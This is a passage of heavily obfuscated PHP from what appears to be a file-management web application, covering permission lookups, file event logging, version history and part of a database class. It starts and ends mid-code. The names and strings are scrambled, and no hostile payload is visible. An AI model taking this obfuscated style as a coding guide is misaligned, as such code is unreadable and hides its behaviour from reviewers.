$Íƒ¡öÕò = array_reverse(array_slice($æ¡ßı ¬, $ÜÅÖ·‰ñ)); $üÆòñşã = array_search($ïæõê×Ş, $Íƒ¡öÕò); if ($üÆòñşã !== !1 && $üÆòñşã + 1 <= $àä‡ÃÚš) { $àä‡ÃÚš = $üÆòñşã + 1; } } } return $àä‡ÃÚš; } private function userGroupList($ŠÈáÆŞ³ = false) { $“Úç¼ÒÊ =& $_SERVER[™»È’øè]; static $ó™¦ÙÛ» = array(); if (isset($ó™¦ÙÛ»[$ŠÈáÆŞ³])) { return $ó™¦ÙÛ»[$ŠÈáÆŞ³]; } $²ÆŞº¿— = Model($“Úç¼ÒÊ[566])->getInfo($ŠÈáÆŞ³); $ó™¦ÙÛ»[$ŠÈáÆŞ³] = array_to_keyvalue($²ÆŞº¿—[$“Úç¼ÒÊ[2057]], $“Úç¼ÒÊ[1870]); return $ó™¦ÙÛ»[$ŠÈáÆŞ³]; } public function userGroupParents($”ïïİÚÌ) { $¥æœĞëª =& $_SERVER[™»È’øè]; static $®í”ÙšÌ = array(); $”ïïİÚÌ = $”ïïİÚÌ ? $”ïïİÚÌ : USER_ID; if (isset($®í”ÙšÌ[$”ïïİÚÌ])) { return $®í”ÙšÌ[$”ïïİÚÌ]; } $˜¿´®ñ² = $this->userGroupList($”ïïİÚÌ); $”´©´Û = array(); $’Š¬œá¿ = $GLOBALS[$¥æœĞëª[6]][$¥æœĞëª[89]][$¥æœĞëª[1973]] == 1; $Şû’£ÆÚ = $’Š¬œá¿ ? 3 : 2; foreach ($˜¿´®ñ² as $õŒõ€ú‡) { $ÃÌ’ËÃŠ = array($õŒõ€ú‡[$¥æœĞëª[1870]]); $àŞŠ‹ƒ = explode($¥æœĞëª[50], trim($õŒõ€ú‡[$¥æœĞëª[552]], $¥æœĞëª[50])); if ($àŞŠ‹ƒ[0] == $¥æœĞëª[211] && count($àŞŠ‹ƒ) > $Şû’£ÆÚ) { $‰æÎªçã = array_slice($àŞŠ‹ƒ, $Şû’£ÆÚ); $ÃÌ’ËÃŠ = array_merge($ÃÌ’ËÃŠ, array_reverse($‰æÎªçã)); } $”´©´Û = array_merge($”´©´Û, $ÃÌ’ËÃŠ); } $®í”ÙšÌ[$”ïïİÚÌ] = array_unique($”´©´Û); return $®í”ÙšÌ[$”ïïİÚÌ]; } public function authTargetInfoMake($ÓÑ»¿†Ã) { $Ëàİü =& $_SERVER[™»È’øè]; $ÑÊô½Ü† = array(); $Ñ“óÔ¥ = array(); foreach ($ÓÑ»¿†Ã as $‡†¹âÑ) { if ($‡†¹âÑ[$Ëàİü[177]] == SourceModel::TYPE_USER) { $ÑÊô½Ü†[] = intval($‡†¹âÑ[$Ëàİü[537]]); } else { if ($‡†¹âÑ[$Ëàİü[177]] == SourceModel::TYPE_GROUP) { $Ñ“óÔ¥[] = intval($‡†¹âÑ[$Ëàİü[537]]); } } } if ($ÑÊô½Ü†) { $ÑÊô½Ü† = Model($Ëàİü[545])->userListInfo($ÑÊô½Ü†); } if ($Ñ“óÔ¥) { $ÑŞ•¯ğ = array($Ëàİü[1958] => array($Ëàİü[459], $Ñ“óÔ¥)); $Ñ“óÔ¥ = Model($Ëàİü[553])->field($Ëàİü[2086])->where($ÑŞ•¯ğ)->select(); $Ñ“óÔ¥ = array_to_keyvalue($Ñ“óÔ¥, $Ëàİü[1870]); } return array($Ëàİü[2087] => $ÑÊô½Ü†, $Ëàİü[2088] => $Ñ“óÔ¥); } public function authInfo($øš¬ÜØŠ) { $³­¥ò£Š =& $_SERVER[™»È’øè]; if ($øš¬ÜØŠ[$³­¥ò£Š[1974]]) { $èô¶ö• = Model($³­¥ò£Š[539])->listData($øš¬ÜØŠ[$³­¥ò£Š[1974]]); if (!$èô¶ö•) { return !1; $ğ‘€¿¥ = Model($³­¥ò£Š[539])->listData(); $İÄ¯ôîˆ = array_filter_by_field($ğ‘€¿¥, $³­¥ò£Š[454], $³­¥ò£Š[211]); return $İÄ¯ôîˆ; } $ı™›û“Š = array_field_key($èô¶ö•, array($³­¥ò£Š[442], $³­¥ò£Š[32], $³­¥ò£Š[454], $³­¥ò£Š[1893], $³­¥ò£Š[1894])); $ı™›û“Š[$³­¥ò£Š[2089]] = $øš¬ÜØŠ; return $ı™›û“Š; } else { return array($³­¥ò£Š[460] => 0, $³­¥ò£Š[1876] => $øš¬ÜØŠ[$³­¥ò£Š[2034]], $³­¥ò£Š[461] => $³­¥ò£Š[12], $³­¥ò£Š[1893] => $³­¥ò£Š[2090]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\143\x65\x5f\x65\166\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\164\x65\x54\x69\155\x65", "\x74\151\155\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\x63\164\151\157\x6e"), array("\x64\145\x73\x63", '', "\151\156\163\x65\x72\164\54\x75\x70\144\141\164\x65\54\163\145\154\x65\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ŸÒşÎ, $ÑîÓ—‰Î, $ƒ¨ôÎƒ– = '') { $àÛ¶§–ş =& $_SERVER[™»È’øè]; if (!$this->eventSave) { return; } $¯‹À”â = Model($àÛ¶§–ş[1362])->sourceInfo($ŸÒşÎ); if (!$¯‹À”â) { return !1; } if ($this->isCacheEvent($¯‹À”â, $ÑîÓ—‰Î)) { return; } if ($ƒ¨ôÎƒ– && is_string($ƒ¨ôÎƒ–)) { $ƒ¨ôÎƒ– = array($àÛ¶§–ş[1909] => $ƒ¨ôÎƒ–); } $£¤Éƒé¥ = defined($àÛ¶§–ş[2091]) ? USER_ID : 0; $ğÌüº³» = array($àÛ¶§–ş[458] => $ŸÒşÎ, $àÛ¶§–ş[2092] => $¯‹À”â[$àÛ¶§–ş[179]], $àÛ¶§–ş[2093] => $¯‹À”â[$àÛ¶§–ş[32]], $àÛ¶§–ş[550] => !empty($¯‹À”â[$àÛ¶§–ş[550]]) ? $¯‹À”â[$àÛ¶§–ş[550]] : $àÛ¶§–ş[12], $àÛ¶§–ş[1669] => $£¤Éƒé¥, $àÛ¶§–ş[463] => $ÑîÓ—‰Î, $àÛ¶§–ş[1671] => $ƒ¨ôÎƒ–); $this->addSystemLog($ÑîÓ—‰Î, $ğÌüº³»); unset($ğÌüº³»[$àÛ¶§–ş[2093]], $ğÌüº³»[$àÛ¶§–ş[550]]); return $this->add($ğÌüº³»); } private function addSystemLog($‰Å¤ÄáÚ, $™è¡²õ€) { $¬¦ŞÙŒ¹ =& $_SERVER[™»È’øè]; if ($‰Å¤ÄáÚ == $¬¦ŞÙŒ¹[2094]) { $‰Å¤ÄáÚ = $™è¡²õ€[$¬¦ŞÙŒ¹[493]][$¬¦ŞÙŒ¹[2095]]; } else { if (in_array($‰Å¤ÄáÚ, array($¬¦ŞÙŒ¹[1850], $¬¦ŞÙŒ¹[2096]))) { $‰Å¤ÄáÚ = $™è¡²õ€[$¬¦ŞÙŒ¹[493]][$¬¦ŞÙŒ¹[779]]; } } $í½Ğ¾ä¾ = array_merge($™è¡²õ€, array($¬¦ŞÙŒ¹[2097] => $™è¡²õ€[$¬¦ŞÙŒ¹[180]], $¬¦ŞÙŒ¹[2098] => $™è¡²õ€[$¬¦ŞÙŒ¹[2098]])); Hook::trigger($¬¦ŞÙŒ¹[2099], $¬¦ŞÙŒ¹[2100] . $‰Å¤ÄáÚ, $™è¡²õ€); Model($¬¦ŞÙŒ¹[1814])->addLog($¬¦ŞÙŒ¹[2100] . $‰Å¤ÄáÚ, $í½Ğ¾ä¾); } private function isCacheEvent($šòÛ¶, $Ù¹©µĞ) { if ($šòÛ¶[$_SERVER[™»È’øè][177]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Ï¯Ø§Œ­, $äÔìÌø) { $Ìê††Ü´ =& $_SERVER[™»È’øè]; $¬±ª—úß = Model($Ìê††Ü´[1362])->sourceInfo($Ï¯Ø§Œ­); $ÙÀÀËÛ = array($Ìê††Ü´[2095] => $äÔìÌø, $Ìê††Ü´[32] => $¬±ª—úß[$Ìê††Ü´[32]]); return $this->addEvent($Ï¯Ø§Œ­, $Ìê††Ü´[2094], $ÙÀÀËÛ); } public function eventFileEdit($¿É‘¾é) { $š‚ÇğÊ =& $_SERVER[™»È’øè]; $ñÕÆü = array($š‚ÇğÊ[2101] => $_SERVER[$š‚ÇğÊ[2102]], $š‚ÇğÊ[2103] => strtolower(ACTION)); if (isset($GLOBALS[$š‚ÇğÊ[7]][$š‚ÇğÊ[2104]])) { $ñÕÆü[$š‚ÇğÊ[2104]] = $š‚ÇğÊ[88]; } return $this->addEvent($¿É‘¾é, $š‚ÇğÊ[1840], $ñÕÆü); } public function eventRecycle($ôéÆŠ­È, $–±çÌğ’) { return $this->addEvent($ôéÆŠ­È, $_SERVER[™»È’øè][2096], $–±çÌğ’); } public function eventRemove($¿ªĞÈíç) { $òÁ¹‚Ìğ =& $_SERVER[™»È’øè]; $Ú¸³¼æé = Model($òÁ¹‚Ìğ[1362])->sourceInfo($¿ªĞÈíç); $£•é»½• = $Ú¸³¼æé[$òÁ¹‚Ìğ[32]]; return $this->addEvent($Ú¸³¼æé[$òÁ¹‚Ìğ[179]], $òÁ¹‚Ìğ[1839], $£•é»½•); } public function eventShare($©Ë¦ê²™, $»¤İ½–) { return $this->addEvent($©Ë¦ê²™, $_SERVER[™»È’øè][1850], $»¤İ½–); } public function eventMove($¿ æä£, $Àš÷Ø¹Ñ, $¯–ŒşØ•) { $ŒâçÒÈã =& $_SERVER[™»È’øè]; $°×”šŒó = Model($ŒâçÒÈã[1362]); $«Õì®Ü = $°×”šŒó->sourceInfo($¿ æä£); $àæ®Ï = $°×”šŒó->sourceInfo($Àš÷Ø¹Ñ); $Õ©‚ƒç = $°×”šŒó->sourceInfo($¯–ŒşØ•); $¥›áô¤® = array($ŒâçÒÈã[1190] => $Àš÷Ø¹Ñ, $ŒâçÒÈã[2105] => $àæ®Ï[$ŒâçÒÈã[32]], $ŒâçÒÈã[2082] => !empty($àæ®Ï[$ŒâçÒÈã[550]]) ? $àæ®Ï[$ŒâçÒÈã[550]] : $ŒâçÒÈã[12], $ŒâçÒÈã[1191] => $¯–ŒşØ•, $ŒâçÒÈã[2106] => $Õ©‚ƒç[$ŒâçÒÈã[32]], $ŒâçÒÈã[2107] => !empty($Õ©‚ƒç[$ŒâçÒÈã[550]]) ? $Õ©‚ƒç[$ŒâçÒÈã[550]] : $ŒâçÒÈã[12]); $this->addEvent($¿ æä£, $ŒâçÒÈã[587], $¥›áô¤®); $«Õì®Ü = $°×”šŒó->sourceInfo($¿ æä£); $¥›áô¤® = array($ŒâçÒÈã[180] => $«Õì®Ü[$ŒâçÒÈã[180]], $ŒâçÒÈã[32] => $«Õì®Ü[$ŒâçÒÈã[32]]); $this->addEvent($Àš÷Ø¹Ñ, $ŒâçÒÈã[2108], $¥›áô¤®); } public function eventCopy($ùÆ¡Ó™İ) { $this->eventCreate($ùÆ¡Ó™İ, $_SERVER[™»È’øè][585]); } public function eventRename($“üÒØ», $ÃÃÌìø, $·ñ§Æç¼) { $ùÄŞšö– =& $_SERVER[™»È’øè]; $Ä°›İñÁ = array($ùÄŞšö–[1190] => $ÃÃÌìø, $ùÄŞšö–[1191] => $·ñ§Æç¼); return $this->addEvent($“üÒØ», $ùÄŞšö–[1376], $Ä°›İñÁ); } public function eventAddComment($¸„‰¤ô´, $ôŠÅÃ¶) { return $this->addEvent($¸„‰¤ô´, $_SERVER[™»È’øè][2109], $ôŠÅÃ¶); } public function eventAddDesc($ÀÈ³ˆì­, $­ÒãçÓÏ) { return $this->addEvent($ÀÈ³ˆì­, $_SERVER[™»È’øè][2110], $­ÒãçÓÏ); } public function listBySource($‚¼„²ùÕ) { $ÍÛ½äÛı =& $_SERVER[™»È’øè]; $±ÛÀ­ºø = Model($ÍÛ½äÛı[1362])->sourceInfo($‚¼„²ùÕ); $ÕÈÍ£¿« = array($ÍÛ½äÛı[458] => $‚¼„²ùÕ); if ($±ÛÀ­ºø[$ÍÛ½äÛı[452]] == $ÍÛ½äÛı[88]) { $İÇÛ‹îÂ = Model($ÍÛ½äÛı[1362])->listSearchChildren($‚¼„²ùÕ, 20000); $İÇÛ‹îÂ[] = $‚¼„²ùÕ . $ÍÛ½äÛı[421]; $ÕÈÍ£¿« = array($ÍÛ½äÛı[180] => array($ÍÛ½äÛı[7], $İÇÛ‹îÂ)); } $‰°üê¥‡ = $this->where($ÕÈÍ£¿«)->order($ÍÛ½äÛı[2111])->selectPage(); if ($‰°üê¥‡[$ÍÛ½äÛı[409]][$ÍÛ½äÛı[410]] == 0) { $‰°üê¥‡[$ÍÛ½äÛı[409]][$ÍÛ½äÛı[410]] = 1; $‰°üê¥‡[$ÍÛ½äÛı[412]] = array(array($ÍÛ½äÛı[458] => $‚¼„²ùÕ, $ÍÛ½äÛı[2092] => $±ÛÀ­ºø[$ÍÛ½äÛı[179]], $ÍÛ½äÛı[1669] => $±ÛÀ­ºø[$ÍÛ½äÛı[494]], $ÍÛ½äÛı[463] => $ÍÛ½äÛı[2112], $ÍÛ½äÛı[464] => $±ÛÀ­ºø[$ÍÛ½äÛı[214]], $ÍÛ½äÛı[1671] => $ÍÛ½äÛı[12])); } return $this->eventListParse($‰°üê¥‡, $‚¼„²ùÕ); } private function eventListParse($ş»Òù’ê, $“»›©Óˆ) { $ıÛåÇú =& $_SERVER[™»È’øè]; $ÊÁôÑŸˆ = $ş»Òù’ê[$ıÛåÇú[412]]; $ÒÀ™€ğ® = array_to_keyvalue($ÊÁôÑŸˆ, $ıÛåÇú[12], $ıÛåÇú[180]); $š‚ûäçã = array_to_keyvalue($ÊÁôÑŸˆ, $ıÛåÇú[12], $ıÛåÇú[2098]); foreach ($ÊÁôÑŸˆ as $Ì«¤ƒ‹Ş) { $ÛÍçµ = $Ì«¤ƒ‹Ş[$ıÛåÇú[493]]; if ($Ì«¤ƒ‹Ş[$ıÛåÇú[33]] == $ıÛåÇú[587] && isset($ÛÍçµ[$ıÛåÇú[1190]])) { $ÒÀ™€ğ®[] = $ÛÍçµ[$ıÛåÇú[1190]] . $ıÛåÇú[12]; $ÒÀ™€ğ®[] = $ÛÍçµ[$ıÛåÇú[1191]] . $ıÛåÇú[12]; } if ($Ì«¤ƒ‹Ş[$ıÛåÇú[33]] == $ıÛåÇú[2108] && isset($ÛÍçµ[$ıÛåÇú[180]])) { $ÒÀ™€ğ®[] = $ÛÍçµ[$ıÛåÇú[180]] . $ıÛåÇú[12]; } } $ÒÀ™€ğ® = array_merge($ÒÀ™€ğ®, $š‚ûäçã, array($“»›©Óˆ . $ıÛåÇú[12])); $ÒÀ™€ğ® = array_unique($ÒÀ™€ğ®); $óÊê¾§Õ = array_unique(array_to_keyvalue($ÊÁôÑŸˆ, $ıÛåÇú[12], $ıÛåÇú[1678])); $ìøôÊ¸‹ = Model($ıÛåÇú[566])->userListInfo($óÊê¾§Õ); $’‘é·ĞŞ = Model($ıÛåÇú[850])->sourceListInfo($ÒÀ™€ğ®, !0); foreach ($ÊÁôÑŸˆ as &$Ì«¤ƒ‹Ş) { if ($Ì«¤ƒ‹Ş[$ıÛåÇú[33]] == $ıÛåÇú[587] && isset($Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[1190]])) { $Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[1190]] = $’‘é·ĞŞ[$Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[1190]]]; $Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[1191]] = $’‘é·ĞŞ[$Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[1191]]]; } if ($Ì«¤ƒ‹Ş[$ıÛåÇú[33]] == $ıÛåÇú[2108] && isset($Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[180]])) { $Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[180]] = $’‘é·ĞŞ[$Ì«¤ƒ‹Ş[$ıÛåÇú[493]][$ıÛåÇú[180]]]; } $Ì«¤ƒ‹Ş[$ıÛåÇú[87]] = $’‘é·ĞŞ[$Ì«¤ƒ‹Ş[$ıÛåÇú[180]]]; $Ì«¤ƒ‹Ş[$ıÛåÇú[2113]] = $’‘é·ĞŞ[$Ì«¤ƒ‹Ş[$ıÛåÇú[2098]]]; if ($Ì«¤ƒ‹Ş[$ıÛåÇú[33]] == $ıÛåÇú[1839]) { $Ì«¤ƒ‹Ş[$ıÛåÇú[2113]] = $Ì«¤ƒ‹Ş[$ıÛåÇú[87]]; $Ì«¤ƒ‹Ş[$ıÛåÇú[2098]] = $Ì«¤ƒ‹Ş[$ıÛåÇú[2113]][$ıÛåÇú[180]]; $Ì«¤ƒ‹Ş[$ıÛåÇú[87]] = !1; $Ì«¤ƒ‹Ş[$ıÛåÇú[180]] = $ıÛåÇú[12]; } $Ì«¤ƒ‹Ş[$ıÛåÇú[2042]] = $ìøôÊ¸‹[$Ì«¤ƒ‹Ş[$ıÛåÇú[1678]]]; } unset($Ì«¤ƒ‹Ş); $ş»Òù’ê[$ıÛåÇú[412]] = $ÊÁôÑŸˆ; return $ş»Òù’ê; } public function removeBySource($ö¾×òåí) { $°’ûÉãŞ = array($_SERVER[™»È’øè][458] => $ö¾×òåí); $this->where($°’ûÉãŞ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\150\151\x73\x74\x6f\162\x79"; public function historyCount($‡æÂµšŸ) { $”úœÔ‡Ä =& $_SERVER[™»È’øè]; if (!$‡æÂµšŸ) { return array(); } if (is_string($‡æÂµšŸ) || is_int($‡æÂµšŸ)) { $‡æÂµšŸ = array($‡æÂµšŸ); } $È±‹ú™ = array($”úœÔ‡Ä[180], $”úœÔ‡Ä[1903] => $”úœÔ‡Ä[532]); $àÜâ›˜Ó = array($”úœÔ‡Ä[180] => array($”úœÔ‡Ä[7], $‡æÂµšŸ)); $öÍ²“üü = $this->field($È±‹ú™)->where($àÜâ›˜Ó)->group($”úœÔ‡Ä[180])->select(); return array_to_keyvalue($öÍ²“üü, $”úœÔ‡Ä[180], $”úœÔ‡Ä[532]); } public function addHistory($ÍÖÓÛé€, $Å©ğ—Ï = '') { $µ–š¼î¼ =& $_SERVER[™»È’øè]; $¯›‡çôç = array($µ–š¼î¼[458] => $ÍÖÓÛé€[$µ–š¼î¼[180]], $µ–š¼î¼[1669] => isset($ÍÖÓÛé€[$µ–š¼î¼[496]]) ? $ÍÖÓÛé€[$µ–š¼î¼[496]] : $ÍÖÓÛé€[$µ–š¼î¼[494]], $µ–š¼î¼[509] => $ÍÖÓÛé€[$µ–š¼î¼[508]], $µ–š¼î¼[584] => $ÍÖÓÛé€[$µ–š¼î¼[76]], $µ–š¼î¼[2114] => $Å©ğ—Ï); if ($GLOBALS[$µ–š¼î¼[6]][$µ–š¼î¼[89]][$µ–š¼î¼[1247]] >= 1) { $this->historyAutoClear($¯›‡çôç[$µ–š¼î¼[180]]); $this->add($¯›‡çôç); } Hook::trigger($µ–š¼î¼[2115], $¯›‡çôç); Model($µ–š¼î¼[2116])->eventFileEdit($ÍÖÓÛé€[$µ–š¼î¼[180]]); } private function historyAutoClear($ä—‹¢¢¬) { $µÆÄõ“Î =& $_SERVER[™»È’øè]; $ìû±ûúå = Model($µÆÄõ“Î[795])->get($µÆÄõ“Î[1269]); $Ú®Šúã‘ = $GLOBALS[$µÆÄõ“Î[6]][$µÆÄõ“Î[89]][$µÆÄõ“Î[1247]]; $è§•ûŠò = $ìû±ûúå == $µÆÄõ“Î[1270] ? min(5, $Ú®Šúã‘) : $Ú®Šúã‘; $è§•ûŠò = $è§•ûŠò <= 0 ? 0 : $è§•ûŠò - 1; if ($è§•ûŠò >= 500) { return; } $Ö¬ßı¼¥ = array($µÆÄõ“Î[458] => $ä—‹¢¢¬); $¸¶õ†®Ğ = $this->field($µÆÄõ“Î[2117])->where($Ö¬ßı¼¥)->order($µÆÄõ“Î[2111])->select(); if (!$¸¶õ†®Ğ || $è§•ûŠò >= count($¸¶õ†®Ğ)) { return; } $Î²ÓÛşè = array_to_keyvalue($¸¶õ†®Ğ, $µÆÄõ“Î[12], $µÆÄõ“Î[442]); $Î²ÓÛşè = array_slice($Î²ÓÛşè, $è§•ûŠò); $Éôèöü = array_to_keyvalue($¸¶õ†®Ğ, $µÆÄõ“Î[12], $µÆÄõ“Î[508]); $Éôèöü = array_slice($Éôèöü, $è§•ûŠò); if (!$Î²ÓÛşè || !$Éôèöü) { return; } $Ö¬ßı¼¥ = array($µÆÄõ“Î[460] => array($µÆÄõ“Î[7], $Î²ÓÛşè)); $this->where($Ö¬ßı¼¥)->delete(); Model($µÆÄõ“Î[511])->remove($Éôèöü); } public function listData($Ê÷¿™şÁ) { $¶¹‡Š¿é =& $_SERVER[™»È’øè]; $üšø¿ß = array($¶¹‡Š¿é[458] => $Ê÷¿™şÁ); $Å·ğ´Œ = $¶¹‡Š¿é[2118]; $¿•€øİƒ = $this->field($Å·ğ´Œ)->where($üšø¿ß)->order($¶¹‡Š¿é[2111])->selectPage(); $this->_listAppendUser($¿•€øİƒ[$¶¹‡Š¿é[412]]); $’»†Ï = Model($¶¹‡Š¿é[795])->get($¶¹‡Š¿é[1269]); $ÙİŠĞ¾Ù = 5; if ($’»†Ï == $¶¹‡Š¿é[1270]) { $¿•€øİƒ[$¶¹‡Š¿é[412]] = array_slice($¿•€øİƒ[$¶¹‡Š¿é[412]], 0, $ÙİŠĞ¾Ù); $¿•€øİƒ[$¶¹‡Š¿é[409]] = array($¶¹‡Š¿é[2119] => 1, $¶¹‡Š¿é[2120] => 20, $¶¹‡Š¿é[2121] => 1, $¶¹‡Š¿é[2122] => count($¿•€øİƒ[$¶¹‡Š¿é[412]])); } return $¿•€øİƒ; } protected function _listAppendUser(&$¨°›¨•’) { $Ôà×–í =& $_SERVER[™»È’øè]; $ Õ– ®µ = array_to_keyvalue($¨°›¨•’, $Ôà×–í[12], $Ôà×–í[1678]); $õÒŒßí = Model($Ôà×–í[566])->userListInfo($ Õ– ®µ); foreach ($¨°›¨•’ as &$ÂâÑë†) { $°ª¡ŞÅ = $ÂâÑë†[$Ôà×–í[1678]]; $ÂâÑë†[$Ôà×–í[494]] = $õÒŒßí[$°ª¡ŞÅ] ? $õÒŒßí[$°ª¡ŞÅ] : !1; } unset($ÂâÑë†); } public function fileInfo($ÄÅ‡Úõ…) { $Óë»œÇ =& $_SERVER[™»È’øè]; $ÓˆŞ¦ï‰ = $this->tablePrefix; $ •Ûóò“ = "{$ÓˆŞ¦ï‰}\151\x6f\137\146\151\x6c\x65\40\146\151\x6c\x65\163\40\x6f\x6e\x20\146\151\154\x65\163\x2e\146\151\x6c\145\111\104\40\75\40\x68\x69\x73\x74\x6f\162\x79\56\x66\151\154\x65\111\104"; return $this->alias($Óë»œÇ[2123])->where(array($Óë»œÇ[460] => $ÄÅ‡Úõ…))->join($ •Ûóò“, $Óë»œÇ[2124])->find(); } public function removeItem($æ…ñí€) { $ÔŸÍìô³ =& $_SERVER[™»È’øè]; $Şúß¢ÚŒ = array($ÔŸÍìô³[460] => $æ…ñí€); $‰ƒ©‰ğ‹ = $this->where($Şúß¢ÚŒ)->find(); if ($‰ƒ©‰ğ‹) { $€ËÈá¢™ = $this->where($Şúß¢ÚŒ)->delete(); Model($ÔŸÍìô³[511])->remove($‰ƒ©‰ğ‹[$ÔŸÍìô³[508]]); return $€ËÈá¢™; } return !1; } public function removeBySource($ıÒÑòÀ–) { $Å…æÓ¹ê =& $_SERVER[™»È’øè]; if (!$ıÒÑòÀ–) { return !1; } if (!is_array($ıÒÑòÀ–)) { $ıÒÑòÀ– = array($ıÒÑòÀ–); } $ò¢ğ  ¼ = array($Å…æÓ¹ê[458] => array($Å…æÓ¹ê[7], $ıÒÑòÀ–)); $Øµˆôú· = $this->field($Å…æÓ¹ê[509])->where($ò¢ğ  ¼)->select(); if ($Øµˆôú·) { $this->where($ò¢ğ  ¼)->delete(); $“÷óíˆø = array_to_keyvalue($Øµˆôú·, $Å…æÓ¹ê[12], $Å…æÓ¹ê[508]); Model($Å…æÓ¹ê[511])->remove($“÷óíˆø); } return !0; } public function setDetail($¯öìÉö, $®Ï“ºø) { $•èÌüñÑ =& $_SERVER[™»È’øè]; return $this->where(array($•èÌüñÑ[460] => $¯öìÉö))->save(array($•èÌüñÑ[2114] => $®Ï“ºø)); } public function rollbackToItem($ƒò„†Ç, $¯†‡ù¹) { $Åœƒûùõ =& $_SERVER[™»È’øè]; $’®Æä²è = Model($Åœƒûùõ[850])->sourceInfo($ƒò„†Ç); $this->addHistory($’®Æä²è, LNG($Åœƒûùõ[2125])); $ª³©Œ¨Ò = $this->find($¯†‡ù¹); $ˆÌØúŒğ = array($Åœƒûùõ[508] => $ª³©Œ¨Ò[$Åœƒûùõ[508]], $Åœƒûùõ[76] => $ª³©Œ¨Ò[$Åœƒûùõ[76]], $Åœƒûùõ[85] => time(), $Åœƒûùõ[496] => USER_ID); Model($Åœƒûùõ[850])->where(array($Åœƒûùõ[180] => $ƒò„†Ç))->save($ˆÌØúŒğ); return $this->where(array($Åœƒûùõ[460] => $¯†‡ù¹))->delete(); } public function clearSame($üµäËÔß) { $‹„’¯´  =& $_SERVER[™»È’øè]; $™”€…§Î = $this->listData($üµäËÔß); $Øıœå¿õ = array_to_keyvalue_group($™”€…§Î, $‹„’¯´ [508]); $¢îˆ·Í = array(); $É»Á•õù = array(); foreach ($Øıœå¿õ as $õäœ¼Ñé) { if (!$õäœ¼Ñé || count($õäœ¼Ñé) <= 1) { continue; } foreach ($õäœ¼Ñé as $‡œÌ¼¿¨) { $¢îˆ·Í[] = $‡œÌ¼¿¨[$‹„’¯´ [508]]; $É»Á•õù[] = $‡œÌ¼¿¨[$‹„’¯´ [442]]; } } if (!$É»Á•õù) { return; } $this->where(array($‹„’¯´ [442] => array($‹„’¯´ [7], $É»Á•õù)))->delete(); Model($‹„’¯´ [511])->remove($¢îˆ·Í); } public function userSpace() { $ØÛŒÓúã =& $_SERVER[™»È’øè]; $¸ı×ÓË² = $this->tablePrefix; $–õÉÎıÜ = array($ØÛŒÓúã[1669] => USER_ID); $‹’á‘åú = "{$¸ı×ÓË²}\151\x6f\x5f\x66\x69\154\x65\x20\146\x69\154\145\163\40\x6f\156\x20\146\x69\x6c\x65\x73\56\146\151\154\x65\111\104\40\75\40\x68\x69\x73\x74\157\x72\171\x2e\146\151\x6c\x65\111\104"; return $this->alias($ØÛŒÓúã[2123])->where($–õÉÎıÜ)->join($‹’á‘åú, $ØÛŒÓúã[2124])->sum($ØÛŒÓúã[76]); } } goto bó‚“öÒÙ³; EøÛƒÂÅïƒ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\161" => "\74\76", "\x67\164" => "\x3e", "\145\147\164" => "\x3e\75", "\154\x74" => "\74", "\145\154\164" => "\x3c\75", "\156\157\x74\x6c\151\153\145" => "\116\117\124\x20\114\x49\x4b\105", "\x6c\x69\x6b\145" => "\114\x49\113\x45", "\151\156" => "\x49\116", "\x6e\x6f\164\151\156" => "\x4e\x4f\124\x20\111\116", "\x6e\x6f\164\40\151\x6e" => "\116\117\124\x20\x49\116", "\x62\145\164\x77\145\145\x6e" => "\102\x45\x54\x57\105\x45\x4e", "\x6e\157\164\142\x65\x74\167\x65\x65\156" => "\116\117\124\40\x42\x45\x54\x57\x45\105\x4e", "\x6e\157\x74\x20\x62\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\x42\x45\124\x57\x45\x45\116"); protected $selectSql = "\x53\x45\x4c\105\x43\x54\45\104\x49\x53\x54\111\x4e\x43\124\x25\x20\x25\106\x49\x45\114\104\45\40\x46\x52\x4f\115\40\x25\124\101\102\114\x45\45\45\112\x4f\x49\116\x25\45\x57\x48\x45\122\105\x25\45\107\122\117\125\x50\45\x25\110\101\126\111\116\107\45\x25\117\122\x44\105\x52\x25\45\x4c\x49\115\x49\x54\45\x20\45\125\116\x49\117\116\x25\x25\x43\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ÌÏÌ±©€ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[™»È’øè][990], $ÌÏÌ±©€); } public function factory($ß¯ Ğ• = '') { $˜Ê¼áäü =& $_SERVER[™»È’øè]; $ß¯ Ğ• = $this->parseConfig($ß¯ Ğ•); if (empty($ß¯ Ğ•[$˜Ê¼áäü[991]])) { think_exception(think_lang($˜Ê¼áäü[992])); } $this->dbType = ucwords(strtolower($ß¯ Ğ•[$˜Ê¼áäü[991]])); $î›Ñ…‡â = $˜Ê¼áäü[993] . $this->dbType; if (class_exists($î›Ñ…‡â)) { $è‡ºáÉÛ = new $î›Ñ…‡â($ß¯ Ğ•); if ($˜Ê¼áäü[994] != strtolower($ß¯ Ğ•[$˜Ê¼áäü[991]])) { $è‡ºáÉÛ->dbType = strtoupper($this->dbType); } else { $è‡ºáÉÛ->dbType = $this->_getDsnType($ß¯ Ğ•[$˜Ê¼áäü[946]]); } } else { think_exception(think_lang($˜Ê¼áäü[995]) . $˜Ê¼áäü[996] 